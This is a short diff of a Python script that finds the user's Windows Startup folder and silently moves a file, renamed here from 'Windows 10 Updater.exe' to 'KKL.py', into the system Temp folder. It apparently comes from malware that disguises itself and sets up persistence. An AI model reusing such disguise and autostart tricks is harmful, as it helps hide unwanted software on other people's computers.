@@ -19,7 +19,7 @@ if __name__ == "__main__":
     USER_NAME = getpass.getuser()
     path = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
     try:
-        shutil.move('Windows 10 Updater.exe', "C:\Windows\Temp")
+        shutil.move('KKL.py', "C:\Windows\Temp")
     except:
         pass
 
